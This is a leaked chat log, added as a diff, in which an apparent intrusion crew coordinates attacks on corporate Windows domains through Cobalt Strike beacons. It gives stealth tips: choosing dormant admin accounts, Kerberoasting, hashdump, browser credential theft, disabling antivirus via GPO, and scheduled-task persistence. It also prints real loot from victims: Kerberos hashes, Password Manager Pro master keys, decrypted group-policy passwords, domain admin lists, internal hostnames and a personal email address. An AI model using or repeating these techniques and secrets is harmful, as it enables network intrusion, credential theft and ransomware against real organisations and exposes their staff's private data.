@@ -1,0 +1,3320 @@
+Date: 2020-09-03T12:13:12.518Z
+From: rosette
+Message: Guys, there is a tip for everyone who works with networks::
+When you have a network with rights - if possible, make yourself several sessions on other machines (preferably server ones, they work 24x7). If your entrypoint machine reboots on which the session is, you can independently return to the network without wasting time as a team lead and you don’t have to sit and wait until the session is raised for you.
+=)
+
+Date: 2020-09-11T13:06:40.457Z
+From: red
+Message: @I will add, you always need to climb with a service account, much less% that under it they will climb exactly to this service, the account, respectively, is not SQLLLXXXXADMIN) but installadmin, winadmin, etc.
+
+Date: 2020-09-11T13:06:17.008Z
+From: rosette
+Message: ------------------- IF RDP IN LOCAL IS VERY NEEDED :: HOW NOT TO SLEEP ::
+1. Select the server OS, ping, found. Making a listing of dira
+``ls \\REMOTE-HOSTNAME\C$\Users``
+Sort by Modified. Where there is a fresh touch - it is DEFINITELY IMPOSSIBLE to go under these users, because the following situation will easily arise - you go in, download balls / test something and suddenly this user comes to this PC and sees your work results ... Detect. Cleaning. End of the game.
+To do this, select the user who went to this server last year, say.
+Do you think the mechanics are clear?
+2. Selecting a user from YES that hangs in YES but is almost never used
+```shell net group "Domain Admins" /domain```
+This is a list of our YES
+Next, on the user, we take turns removing the information
+``shell net user Administrator /domain``
+We are looking for the Last Logon line - that is, when you logged in to the network for the last time (on any of the PCs in the grid)
+If there is a date like the month before last, half a year or finally a year - excellent. This is what we need. Most likely, this is either a service account or an admin to which they do not go, and it definitely will not interfere with your RDP.
+
+Such simple tricks will help you not to sleep stupidly on the RDP
+
+3. We do not sit on the RDP, after we have finished - we do Logoff (MANDATORY). Not to be confused with simply closing the RDP window.
+
+
+Date: 2020-09-12T18:40:19.148Z
+From: rosette
+Message: take them from sharpChromium mb will give a ride
+
+Date: 2020-09-12T18:40:13.123Z
+From: rosette
+Message: but for a split you need some credits
+
+Date: 2020-09-12T18:40:00.890Z
+From: rosette
+Message: web crawler + CEE sploit
+
+Date: 2020-09-12T18:31:33.016Z
+From: rosette
+Message: launch a web scanner and set it on ports 80 443 8080 8443 via socks
+
+Date: 2020-09-12T18:30:54.539Z
+From: rosette
+Message: https://github.com/NetSPI/PowerUpSQL
+
+Date: 2020-09-12T18:30:47.083Z
+From: rosette
+Message: also see mssql remote attack
+
+Date: 2020-09-12T18:29:37.636Z
+From: rosette
+Message: https://github.com/Ridter/cve-2020-0688
+
+Date: 2020-09-12T18:05:23.398Z
+From: white
+Message: Salute guys. Such is the question. Share who uses what script if the session is from the network with a user who has slightly more privileges than the "printer". I’ll make a reservation right away that the standard methods have been tried, there are no tokens, the seatbelt, it doesn’t work like any other “execute-assembly” commands (Failed to load the assembly w / hr 0x8007000b) the ball will not move where this user will go either. Access to system folders is closed. In the process from the system, the injection cannot do it either. In general, what do you do in such cases. The question is of a general nature, such are the "hard cases"
+
+Date: 2020-09-17T17:53:15.650Z
+From: rosette
+Message: I recommend decrypting the entire NTDS, if possible, by 200 lines. I often got passes from chrome + ntdsa. literally on the CPU to sort out several seconds)
+
+Date: 2020-09-17T17:52:28.057Z
+From: rosette
+Message: https://null-byte.wonderhowto.com/how-to/crack-password-protected-microsoft-office-files-including-word-docs-excel-spreadsheets-0193959/
+
+Date: 2020-09-17T14:13:31.905Z
+From: brandon
+Message: people, .docx is password protected, does anyone know how to open it?
+
+Date: 2020-09-17T19:25:55.167Z
+From: user7
+Message: ```
+beacon> hashdump
+[*] Tasked beacon to dump hashes
+[+] host called home, sent: 82501 bytes
+[+] received password hashes:
+
+Date: 2020-09-17T19:01:22.476Z
+From: user7
+Message: ```
+[!] CVE-2019-1064 : VULNERABLE
+[>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+[!] CVE-2019-1130 : VULNERABLE
+[>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+[!] CVE-2019-1253 : VULNERABLE
+[>] https://github.com/padovah4ck/CVE-2019-1253
+
+[!] CVE-2019-1315 : VULNERABLE
+[>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+[!] CVE-2019-1385 : VULNERABLE
+[>] https://www.youtube.com/watch?v=K6gHnr-VkAg
+
+[!] CVE-2019-1388 : VULNERABLE
+[>] https://github.com/jas502n/CVE-2019-1388
+
+[!] CVE-2019-1405 : VULNERABLE
+[>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system -via-the-upnp-device-host-service-and-the-update-orchestrator-service/
+[>]https://github.com/apt69/COMahawk
+
+Date: 2020-09-21T10:25:57.722Z
+From: tl1
+Message: shorten to telnet,ssh,web,mssql,smb,rdp,vnc
+Date: 2020-09-21T10:25:01.663Z
+From: tl1
+Message: `ports 1-1024,3389,5900-6000`
+why scan such a range? there are 900 empty ports and no mssql?
+
+Date: 2020-09-21T12:30:46.084Z
+From: user4
+Message: @tl1 can we somehow take an msi or exe file from his desktop, add our load to it and force it to run? It's just for him. the table has installers and the same anydesk, which it probably launches without installing ..
+
+Date: 2020-09-21T12:25:17.925Z
+From: user8
+Message: `pmp_key.key`
+```
+#This file contains the master AES encryption key for this installation, automatically generated by Password Manager Pro.
+#The default location of this file is <PMP_HOME>conf and it is not secure to leave this file here, unless
+#the server is sufficiently hardened to protect any illegal access of this file.
+#It is highly recommended to move this file out of its default location and for instructions to securely store this file refer.
+#OLDENCRYPTIONKEY=9COBmS4sjljyY8ii1pn9Z2g+CkNUf+qTwR4LvQkVYFA=
+#Tue Dec 10 20:22:53 IST 2019
+ENCRYPTIONKEY=5qRvsVKpPFdB6RnZQI89p6PUYWT6Oki1gHGgZWgRID0\=
+```
+`OLDENCRYPTIONKEY=9COBmS4sjljyY8ii1pn9Z2g+CkNUf+qTwR4LvQkVYFA=`
+`ENCRYPTIONKEY=5qRvsVKpPFdB6RnZQI89p6PUYWT6Oki1gHGgZWgRID0\=`
+
+Date: 2020-09-21T14:58:45.382Z
+From: user8
+Message: `ShareFinder`
+```
+\\tmrm-compliance.csez.zohocorpin.com\ 	DC_Deployment-
+\\tmrm-compliance.csez.zohocorpin.com\ 	F-
+- 5860-	
+
+\\DC-SOFTWARE.csez.zohocorpin.com\ 	iso-
+\\DC-SOFTWARE.csez.zohocorpin.com\print$ 	- Printer Drivers
+\\DC-SOFTWARE.csez.zohocorpin.com\ 	u16-
+\\DC-SOFTWARE.csez.zohocorpin.com\Users 	-
+
+\\print-server-bkp.csez.zohocorpin.com\Coolpay-Server$ 	-
+\\print-server-bkp.csez.zohocorpin.com\D 	-
+\\print-server-bkp.csez.zohocorpin.com\print$ 	- Printer Drivers
+\\print-server-bkp.csez.zohocorpin.com\Users 	-
+
+\\est-desktopcentral.csez.zohocorpin.com\DC Backups 	-
+\\est-desktopcentral.csez.zohocorpin.com\DC_share 	-
+\\est-desktopcentral.csez.zohocorpin.com\logs 	-
+\\est-desktopcentral.csez.zohocorpin.com\pg_log 	-
+\\est-desktopcentral.csez.zohocorpin.com\ScheduledDBBackup 	-
+\\est-desktopcentral.csez.zohocorpin.com\webapps 	-
+
+\\EST-ADC2.csez.zohocorpin.com\NETLOGON 	- Logon server share
+\\EST-ADC2.csez.zohocorpin.com\SYSVOL 	- Logon server share
+
+```
+still looking for
+
+Date: 2020-09-21T11:41:03.391Z
+From: user4
+Message: csez.zohocorpin.com
+
+Date: 2020-09-21T11:39:54.265Z
+From: user4
+Message: ip DC
+`192.168.100.61`
+
+Date: 2020-09-21T11:22:32.759Z
+From: user3
+Message: ```
+SamAccountName : certsrv
+DistinguishedName : CN=certsrv,CN=Users,DC=csez,DC=zohocorpin,DC=com
+ServicePrincipalName : http/its-winca.csez.zohocorpin.com
+Hash : $krb5tgs$18$*$csez.zohocorpin.com$http/its-winca.csez.zohocorpin.com*$AD257AAE06
+D3290ED5802E98A5680072$074EFBF3ED77AAD8403FFD9B1DC91C3A4548ABC68CC6D82693883D1F2
+674826398708B33E7474B1A7A88CDBB147CEE0E9E55DF333D38AF6E6BF1FFCC9B9848E96372B2684
+F5D616B986D16C673820FEF3EDFE905FC2EC48B0BE46A4AC3229930167A88F92124F509C9FE99EE6
+074CA3F7443F08AB4F49CE97F02D83CE21E7958541219280C06EC0259FFEE7DD9BDA9FCC28C69984
+884576F8A098B0507E45E2EA3A6FBACB1CEFF7F435484F83B050C3D9B2DC68E5983963629CE1C04D
+72CF0EFA00AA01FC0BDDADDDDDCC3A9F0532EFEC4D88408B597AC74F2668E979E22348E0C6F1890B
+1AE0F8D2724492417699C3BD444312212A5FF50A246D4D5770AD50860E3B52CCD2BCE7A6660DA9B6
+FFE81B456129A617FBF351F815FE23624699E69EFB4F4788531E5677B125136BCF1AD9DCC3C8C139
+B36C05C5A493BE7237E14D4F194307F1B7D53F2CA333364CAC135D79688E4A0EBB342BC3DA9C3D12
+7255740A8843B17CAB787077BDDFEF59A916E56392DB087BE09523933671E3832D532D329B2BFCF4
+ECDB2A51274DD50970EC9796AB56788FA7CE668093FC5D68EE6AB796574985BD1CFDAF6EE88416E9
+5F33A3F7C29E4ED1C8804DEA928E2050A2070044A83AF610D673EAF783D3C258BF4F00F3A67EE236
+4A19579A448CEA1806C716B3603C0C6DA9B72BFAB8390CD7971CD4FBE8F022E64828069C478D56CA
+DE866536D19FFB5EF529F408CBC7D9F6B161164632CEE450220CA94B1CD692D9A6C4EACA431AAAD9
+024F429182D8D0B4BAFE8C9B27BE54444DBFB4D7FE2F3949064F9CBC3034F59EF0AD9C01D0238F53
+6614F21303664809AECFE53914D4E16B9222BD0550F8587F39AFA385E87EA7B430994234E883FB46
+150E6BFF285F69F035C0410C11E4610C187EA4A05E57E3FEE8C1CB133DAE9549E9B9E757E0BB9A1E
+5016A8893C2EDECD58D61216879A358AFAE0799986B31CA903B655E244C19ADBF68DB8A8417F5989
+976B4B19CA800E5BF1E8B7227A559E146A7B63360E430B31823801CAA81E625481858F598BB10FF9
+E31F97473E408B67297A919C3C4264ABA52F8242F4F8E07D4946AE7B146A69950C54923A895D333E
+027820953AC4FBED2201253B15B79AC993628CADDA92AA14232A6F0974A19983099890F2119E7D64
+C5AA329A5CE288E7CB3F66AB76619330E27380E145E089DD71799B7B511FBF9A843F8DF6973EBBAC
+5779C06426790A5C7998E94E44341A18CE6D5C4287C93C82286DF1AF180DF16543567A3E9D8A8679
+E5B16BCCD1136074AFD36F9FBA1D8913C50C00718F9B48730670713A50D4590B4FBB8932483A2AE6
+B80BA376DAECB3B8C0C896E6F402E95E6EAE1B5D1B125559904D8B9B295E1F9DEE020493AA73E62C
+22953B86DDC1F71447449C9924192EFA419025D07EA8D8C876FBFC0E697BED24440CEBE3D943AF8B
+F3A5419F139B893CE4A8B4E81EB63BA13DB0B1FB22020BACD3B77E4165E0B0AC2F1109606F976F3F
+C5A62E1704F09522C1683D69278B4E4978E1717EEC5E10F72A17A00B77BE6A2493B3F889AB8EFAF6
+B0F5D73B0999D72F5FACBEED69AF9CCF0F4953104987E7A6ABB8004A640F8
+
+
+```
+
+Date: 2020-09-21T11:13:00.559Z
+From: user8
+Message: `beacon> portscan 10.59.8.0/24 23,22,80,1433,135,445,3389,5900`
+```
+10.59.8.233:80
+10.59.8.223:80
+10.59.8.221:80
+10.59.8.217:80
+10.59.8.213:80
+10.59.8.210:80
+10.59.8.201:80
+10.59.8.204:80
+10.59.8.99:80
+10.59.8.193:80
+10.59.8.188:80
+10.59.8.180:80
+10.59.8.175:80
+10.59.8.167:80
+10.59.8.165:80
+10.59.8.164:80
+10.59.8.160:80
+10.59.8.117:80
+10.59.8.133:80
+10.59.8.132:80
+10.59.8.122:80
+10.59.8.120:80
+10.59.8.103:80
+10.59.8.243:80
+10.59.8.232:80
+10.59.8.147:80
+10.59.8.106:80
+10.59.8.55:80
+10.59.8.112:80
+10.59.8.107:80
+10.59.8.104:80
+10.59.8.98:80
+10.59.8.102:80
+10.59.8.97:80
+10.59.8.88:80
+10.59.8.86:80
+10.59.8.85:80
+10.59.8.84:80
+10.59.8.81:80
+10.59.8.67:80
+10.59.8.61:80
+10.59.8.53:80
+10.59.8.49:80
+10.59.8.41:80
+10.59.8.48:80
+10.59.8.40:80
+10.59.8.34:80
+10.59.8.5:80
+10.59.8.28:80
+10.59.8.19:80
+10.59.8.12:80
+10.59.8.9:80
+```
+`Scanner module is complete`
+
+Date: 2020-09-21T11:10:01.046Z
+From: user8
+message:
+
+Date: 2020-09-21T11:08:44.605Z
+From: user4
+Message: ```
+beacon> shell net group "domain admins" /dom
+[*] Tasked beacon to run: net group "domain admins" /dom
+[+] host called home, sent: 61 bytes
+[+] received output:
+The request will be processed at a domain controller for domain csez.zohocorpin.com.
+
+Group name Domain Admins
+Comment Designated administrators of the domain
+
+Members
+
+-------------------------------------------------- ------------------------------
+Administrator adssp assetprober
+desktopcentral gjprabu-0985 kamal-0150
+nocfw sysadmin sysaudit
+vijay-3486 zohoits
+The command completed successfully.
+
+```
+
+Date: 2020-09-21T11:07:14.050Z
+From: user4
+Message: 10.59.9.180 ping again
+
+Date: 2020-09-21T10:56:52.749Z
+From: user8
+Message: `beacon> portscan 192.168.237.0/24 23,22,80,1433,135,445,3389,5900`
+```
+192.168.237.248:3389
+192.168.237.248:1433
+192.168.237.248:135
+192.168.237.248:80
+192.168.237.239:5900
+192.168.237.231:80
+192.168.237.231:23
+192.168.237.216:3389
+192.168.237.203:80
+192.168.237.196:80
+192.168.237.196:23
+192.168.237.187:3389
+192.168.237.187:135
+192.168.237.187:80
+192.168.237.248:22 (SSH-2.0-WeOnlyDo-wodFTPD 3.3.0.424)
+192.168.237.231:22 (SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8)
+192.168.237.216:22 (SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3)
+192.168.237.203:22 (SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13)
+192.168.237.196:22 (SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.6)
+192.168.237.179:22 (SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8)
+192.168.237.203:23
+192.168.237.239:22 (SSH-2.0-OpenSSH_7.6)
+192.168.237.187:22 (SSH-2.0-6.4.18.407 SSH Tectia Server)
+192.168.237.179:445 (platform: 500 version: 6.1 name: ZLABS-VR-1 domain: WORKGROUP)
+192.168.237.187:445
+192.168.237.239:445
+192.168.237.248:445
+```
+`Scanner module is complete`
+
+Date: 2020-09-21T10:54:42.385Z
+From: user4
+message:
+
+Date: 2020-09-21T10:47:18.146Z
+From: user3
+Message: ```
+[*] OS Build Number: 18363
+[*] Enumerating installed KBs...
+
+4576484
+4517245
+4560959
+4561600
+4565554
+4569073
+4576751
+4576754
+4574727
+
+[!] CVE-2019-1385 : VULNERABLE
+[>] https://www.youtube.com/watch?v=K6gHnr-VkAg
+
+[!] CVE-2019-1405 : VULNERABLE
+[>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system -via-the-upnp-device-host-service-and-the-update-orchestrator-service/
+[>]https://github.com/apt69/COMahawk
+
+[*] Finished. Found 2 potential vulnerabilities.
+
+```
+
+Date: 2020-09-21T10:41:50.615Z
+From: user8
+Message: portscan 172.24.148.0/24
+
+
+Date: 2020-09-21T12:55:53.686Z
+From: user8
+Message: `AdventNetLicense.xml 1`
+```
+ACNTRL = "NO" CompanyName = " Mizuho Information Research Institute Inc" EmailID = "satoru.mochida@mizuho-ir.co.jp" Key = "nJbGSnDTGRbp9NS3dP3XG7cydJJ97SlddJfyGnx3lcQ7ancPJdc7yVJzKJ9VSaSJJJ99ancPJdc7y1bKJPDGyyTdlAaDQaSnndPX9NTTnPfp97KDndV911Py3Aa97dD7ndV917K9u9P9yyPQGAbDufSJuyzTfzlp" LicenseType = "Registered" Name = "ADJ20S6024EI1"
+
+<LicenseKey>
+10Ui0U1W0WkR8H2goMATWU60U0W0Wv4XdNj84XRvNvDbTEVTEWUenjdjenjmjYIHRjYjCj9avsNvY8LUHJ4YX4NjPkRXGNjYvoLLKNkR4NKjYGvRv4s8ivrvHk4RvsKvsNvY8LHJIjYIR8UjCK98maXG8CYjmIKRj4Xs4YX4NjPkRXm8RpiV61100000VdjvsNvY8lETE0U111U5001djRvmj4sKPsL8X4vdvsNvY8l5WskvzFORvQmKn0v4XdLX8Rtskvz0skvzLX8RtFOjnRviXNXmkvz5N8mGXvKR4pMpGv98LXYjlsRvswvs8RHRv4NgRviXNXMGRjvssXp0I0IT28RtssXpsLXR4NvPvRKYvodjdj
+</LicenseKey>
+```
+
+Date: 2020-09-21T12:52:39.719Z
+From: user8
+Message: another `pmp_key.key` file
+```
+#This file contains the master AES encryption key for this installation, automatically generated by Password Manager Pro.
+#The default location of this file is <PMP_HOME>conf and it is not secure to leave this file here, unless
+#the server is sufficiently hardened to protect any illegal access of this file.
+#It is highly recommended to move this file out of its default location and for instructions to securely store this file refer.
+#Thu Jul 23 12:13:08 IST 2020
+ENCRYPTIONKEY=HCUqmg5JnLRACWluto4JNAM/hevFIhFhZuxfXlFumHc\=
+```
+`ENCRYPTIONKEY=HCUqmg5JnLRACWluto4JNAM/hevFIhFhZuxfXlFumHc\=`
+
+Date: 2020-09-21T12:52:09.299Z
+From: tl1
+Message: reshoot with rubeus
+
+Date: 2020-09-21T12:58:05.839Z
+From: tl1
+Message: non-hollow hash
+
+Date: 2020-09-21T12:51:07.393Z
+From: user3
+Message: [*] Tasked beacon to run .NET program: SharpRoast.exe all
+[+] host called home, sent: 120881 bytes
+[+] received output:
+SamAccountName : certsrv
+DistinguishedName : CN=certsrv,CN=Users,DC=csez,DC=zohocorpin,DC=com
+ServicePrincipalName : http/its-winca.csez.zohocorpin.com
+Hash : $krb5tgs$18$*$csez.zohocorpin.com$http/its-winca.csez.zohocorpin.com*$AD257AAE06
+D3290ED5802E98A5680072$074EFBF3ED77AAD8403FFD9B1DC91C3A4548ABC68CC6D82693883D1F2
+674826398708B33E7474B1A7A88CDBB147CEE0E9E55DF333D38AF6E6BF1FFCC9B9848E96372B2684
+F5D616B986D16C673820FEF3EDFE905FC2EC48B0BE46A4AC3229930167A88F92124F509C9FE99EE6
+074CA3F7443F08AB4F49CE97F02D83CE21E7958541219280C06EC0259FFEE7DD9BDA9FCC28C69984
+884576F8A098B0507E45E2EA3A6FBACB1CEFF7F435484F83B050C3D9B2DC68E5983963629CE1C04D
+72CF0EFA00AA01FC0BDDADDDDDCC3A9F0532EFEC4D88408B597AC74F2668E979E22348E0C6F1890B
+1AE0F8D2724492417699C3BD444312212A5FF50A246D4D5770AD50860E3B52CCD2BCE7A6660DA9B6
+FFE81B456129A617FBF351F815FE23624699E69EFB4F4788531E5677B125136BCF1AD9DCC3C8C139
+B36C05C5A493BE7237E14D4F194307F1B7D53F2CA333364CAC135D79688E4A0EBB342BC3DA9C3D12
+7255740A8843B17CAB787077BDDFEF59A916E56392DB087BE09523933671E3832D532D329B2BFCF4
+ECDB2A51274DD50970EC9796AB56788FA7CE668093FC5D68EE6AB796574985BD1CFDAF6EE88416E9
+5F33A3F7C29E4ED1C8804DEA928E2050A2070044A83AF610D673EAF783D3C258BF4F00F3A67EE236
+4A19579A448CEA1806C716B3603C0C6DA9B72BFAB8390CD7971CD4FBE8F022E64828069C478D56CA
+DE866536D19FFB5EF529F408CBC7D9F6B161164632CEE450220CA94B1CD692D9A6C4EACA431AAAD9
+024F429182D8D0B4BAFE8C9B27BE54444DBFB4D7FE2F3949064F9CBC3034F59EF0AD9C01D0238F53
+6614F21303664809AECFE53914D4E16B9222BD0550F8587F39AFA385E87EA7B430994234E883FB46
+150E6BFF285F69F035C0410C11E4610C187EA4A05E57E3FEE8C1CB133DAE9549E9B9E757E0BB9A1E
+5016A8893C2EDECD58D61216879A358AFAE0799986B31CA903B655E244C19ADBF68DB8A8417F5989
+976B4B19CA800E5BF1E8B7227A559E146A7B63360E430B31823801CAA81E625481858F598BB10FF9
+E31F97473E408B67297A919C3C4264ABA52F8242F4F8E07D4946AE7B146A69950C54923A895D333E
+027820953AC4FBED2201253B15B79AC993628CADDA92AA14232A6F0974A19983099890F2119E7D64
+C5AA329A5CE288E7CB3F66AB76619330E27380E145E089DD71799B7B511FBF9A843F8DF6973EBBAC
+5779C06426790A5C7998E94E44341A18CE6D5C4287C93C82286DF1AF180DF16543567A3E9D8A8679
+E5B16BCCD1136074AFD36F9FBA1D8913C50C00718F9B48730670713A50D4590B4FBB8932483A2AE6
+B80BA376DAECB3B8C0C896E6F402E95E6EAE1B5D1B125559904D8B9B295E1F9DEE020493AA73E62C
+22953B86DDC1F71447449C9924192EFA419025D07EA8D8C876FBFC0E697BED24440CEBE3D943AF8B
+F3A5419F139B893CE4A8B4E81EB63BA13DB0B1FB22020BACD3B77E4165E0B0AC2F1109606F976F3F
+C5A62E1704F09522C1683D69278B4E4978E1717EEC5E10F72A17A00B77BE6A2493B3F889AB8EFAF6
+B0F5D73B0999D72F5FACBEED69AF9CCF0F4953104987E7A6ABB8004A640F8
+
+
+[*] Hashes have been saved at: /tmp/hashes-kerberoasting.txt
+[*] Hashes have been saved at: /tmp/hashes-kerberoasting.txt
+
+Date: 2020-09-21T13:05:40.164Z
+From: user8
+Message: ```
+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Users\raja-9298\ EULA_ha.txt
+
+[*] Action: Kerberoasting
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+[*] Searching the current domain for Kerberoastable users
+[X] No users found to Kerberoast!
+[*] Roasted hashes written to : C:\Users\raja-9298\EULA_ha.txt
+
+Date: 2020-09-21T22:21:26.334Z
+From: user7
+Message: ```
+ERROR: FindOne : Exception calling "FindOne" with "0" argument(s): "The server is not operational.
+ERROR: "
+ERROR:
+ERROR: At line:145 char:36
+ERROR: + $user = $search.FindOne<<<<()
+ERROR: + CategoryInfo : NotSpecified: (:) [], MethodInvocationException
+ERROR: FullyQualifiedErrorId : DotNetMethodException
+ERROR:
+ERROR: user : The variable '$user' cannot be retrieved because it has not been set.
+ERROR:
+ERROR: At line:146 char:22
+ERROR: + if ($user <<<< -ne $null)
+ERROR: + CategoryInfo : InvalidOperation: (user:Token) [], RuntimeException
+ERROR: FullyQualifiedErrorId : VariableIsUndefined
+
+```
+
+Date: 2020-09-21T22:18:42.217Z
+From: tl1
+Message: interesting
+
+Date: 2020-09-21T22:09:42.092Z
+From: tl2
+Message: ```
+[+] received output:
+Parsing file: \\GPJ.LOC\sysvol\GPJ.LOC\policies\{20FA66DA-01F3-493D-A72B-23C077395633}\Machine\Preferences\Groups\Groups.xml
+[RESULT] Username: Administrator (built-in)
+[RESULT] Changed: 2015-06-29 09:18:32
+[RESULT] Password: DdhGmek/pc
+[RESULT] Username: install
+[RESULT] Changed: 2015-06-29 09:46:46
+[RESULT] Password: rt/98740/pc
+[RESULT] Username: Lack
+[RESULT] Changed: 2014-10-06 09:45:54
+[RESULT] Password: RT+farbe
+
+Date: 2020-09-21T22:43:56.594Z
+From: tl2
+Message: suggest pinging all live hosts in the domain
+and go through EVERYTHING to this sploit already with domain user's credits
+
+Date: 2020-09-21T22:43:24.393Z
+From: tl2
+Message: to see if not connected to the IPC$ tree
+
+Date: 2020-09-21T22:43:12.302Z
+From: tl2
+Message: not only, you need to include verbose
+
+Date: 2020-09-23T17:38:32.272Z
+From: tl1
+Message: invoke-kerb, exchange, brute, etc
+
+Date: 2020-09-23T17:37:13.744Z
+From: user3
+Message: Run ad_find, seatBelt, ChromeSharp, winpeas, rebeus, Inveit, tried every possible exploit.
+
+Date: 2020-09-24T20:24:55.589Z
+From: white
+Message: Hello everyone, has anyone come across an add-on to veeam backup & replication called pure-storage ?
+from the veeam settings it is clear that the storage is not cloudy but local, on the network the host name of the machine is pinged, portscan showed 22/80/443/ open ports
+when a browser tries to connect, a stub falls out, although it is called pure-storage login, but there are no credit entry windows
+the screen is more for clarity, maybe someone will remember the logo
+
+Date: 2020-09-25T10:56:06.482Z
+From: tl2
+Message: parsing is working with the network through cmd, attempts to raise rights without a backconnect
+Date: 2020-09-25T10:53:32.707Z
+From: user3
+Message: parsing is what?
+Date: 2020-09-25T10:53:24.527Z
+From: tl2
+Message: 1) dns tunneling
+2) parsing WITHOUT externals
+
+Date: 2020-09-25T08:21:29.751Z
+From: tl2
+Message: this is getting into the DMZ via external web access is simple
+
+Date: 2020-09-30T08:32:15.822Z
+From: tl1
+Message: `Windows Executable (S) - RAW` is a stageless option, namely when you make RAW via `Attack -> Packages -> Payload Generator` you make an intermediate file, which, after launch, downloads the working code of the coba itself, to `Windows Executable` immediately this working code goes, no extra paging
+
+From: tl2
+Message: then just vector develop with an indication of the vulnerabilities used (both LPE and network)
+pay attention to MsSql vector too
+
+Message: you still need to look for methods to bypass UAC, or fresh sploits on this topic + parsing the rise through spoolsv
+
+Date: 2020-09-30T20:11:27.214Z
+From: alter
+Message: first third-party AV then disable windef via GPO yes
+
+Date: 2020-09-30T20:06:58.426Z
+From: fly
+Message: The question is how to properly organize the shutdown of these protections? First, a third-party AV, then through the GPO? Or vice versa?
+
+Date: 2020-09-30T10:47:27.609Z
+From: tl2
+Message: and config, yes
+
+Date: 2020-09-30T10:41:31.736Z
+From: tl2
+Message: and rummage through their workstations
+
+Date: 2020-09-30T10:41:26.705Z
+From: tl2
+Message: any vpn, you can look in hell for users who are in VPN / Remote groups or such, if any
+
+Date: 2020-09-30T10:24:38.406Z
+From: tl1
+Message: there will be an additional task: to find a vpn, it is not necessary to open all the PCs in a row in a cob, you can watch fs through net use, or under the YES token (accesses above)
+
+Date: 2020-10-01T17:37:53.013Z
+From: tl2
+Message: 1) look at the shares for interesting files and scripts containing other credits
+2) brute to popular passes sa acc on mssql servers
+3) look at network devices for access to them using default passwords (routers / switches)
+
+Date: 2020-10-01T17:34:51.040Z
+From: user8
+Message: what can be done? @tl2 @tl1
+
+Date: 2020-10-01T17:34:38.019Z
+From: user8
+Message: elevate not working
+
+Date: 2020-10-01T17:34:34.539Z
+From: user8
+Message: LA, but the yuak does not want to bypass
+
+Date: 2020-10-01T17:34:07.776Z
+From: user4
+Message: domain, but LA on his car
+
+Date: 2020-10-01T17:28:08.603Z
+From: user8
+Message: I have no idea, I started the brute, it's still going on, it was in the first lines
+
+Date: 2020-10-01T17:27:40.687Z
+From: tl2
+Message: isn't SBolley a domain user?
+
+
+Date: 2020-10-03T10:56:58.401Z
+From: tl1
+Message: 2-5) first look for analogues of the command on the same git in c# .net application, then third-party modules that can be imported and in extreme cases - upload this module to your dedic, take the source file and transfer it manually to the modules folder on the target car - perform the necessary actions - clean up after yourself
+
+Date: 2020-10-03T10:36:19.091Z
+From: tl1
+Message: for this you will use sploits, uac bypass, spoolsv, etc.
+
+Date: 2020-10-03T10:27:59.815Z	
+	From: tl1
+	Message: 2-1) got an error - google it, learn popular errors over time (cobaltstrike error 5 - If you get an error 5 (access denied) after you try to link to a Beacon)
+	2-2) for passwords and "interesting" files that may contain passwords. you can also look for internal portals that may be vulnerable (ala sql injection), which will allow you to open a session already on the server
+	2-3) did not understand the question
+	2-4) leave the question for now
+	2-5) did not understand the question
+	2-6) the coba itself adds this information when you scan hosts through portscan and the coba sees the OS, it will automatically add it to Targets, the Hashdump command will add hashes, etc.
+
+Date: 2020-10-03T10:08:43.643Z
+From: user8
+Message: 1) This is taken from PowerView via psinject :^), but the fact is that it popped up with both Invoke-Kerberoast and SMBAutoBrute
+
+Date: 2020-10-03T10:05:36.014Z
+From: tl1
+Message: 1) what is the module?
+2) all the features on the page of the git and there is clear help)
+3) psinject executes psh code in another process, which eliminates the possibility of killing the session if the execution of psh code is detected in the system
+4) don't know, never used this argument)
+5) `execute-assembly /SharpChrome.exe logins /showall`
+
+Date: 2020-10-03T18:28:13.452Z
+From: user7
+beacon> shell schtasks /create /ru loomisco.com\Omiller /tn ManagementAgentNTT /tr "rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint" /sc ONCE /sd 10/04/2021 /ST 01: 00/f
+[*] Tasked beacon to run: schtasks /create /ru loomisco.com\Omiller /tn ManagementAgentNTT /tr "rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint" /sc ONCE /sd 10/04/ 2021 /ST 01:00 /f
+[+] host called home, sent: 199 bytes
+SUCCESS: The scheduled task "ManagementAgentNTT" has successfully been created.
+beacon> shell schtasks /run /tn ManagementAgentNTT
+[*] Tasked beacon to run: schtasks /run /tn ManagementAgentNTT
+[+] host called home, sent: 67 bytes
+SUCCESS: Attempted to run the scheduled task "ManagementAgentNTT".
+
+Date: 2020-10-03T18:58:03.081Z
+From: tl1
+Message: C:\, C:\users quite prominent places
+
+Date: 2020-10-03T18:58:00.239Z
+From: user9
+Message: well, it's clear, I'm just an example
+
+Date: 2020-10-03T18:57:50.847Z
+From: tl1
+Message: I do not recommend putting files in such places, since the rights systems are anyway - C:\windows\temp
+
+Date: 2020-10-03T18:57:07.744Z
+From: user9
+Message: wmic /node:Metafile-vm1.loomisco.com process call create "netstat.exe -abno > C:\output.txt"
+
+Date: 2020-10-03T18:54:47.463Z
+From: tl1
+Message: @user8 let's see the list of installed software then
+
+Date: 2020-10-03T18:54:24.029Z
+From: tl1
+Message: carefully remove the netstat here with the -abno options
+
+Date: 2020-10-04T11:28:54.304Z
+From: user7
+Message: currently looking for configs from Citrix
+
+Date: 2020-10-05T13:18:02.131Z
+From: tl1
+Message: in which:
+1) YES, hell info, EA, LA on MAC, hashes of all users
+2) Sort all PCs in the domain
+3) What EDR and where is it administered (admin panel with valid access)
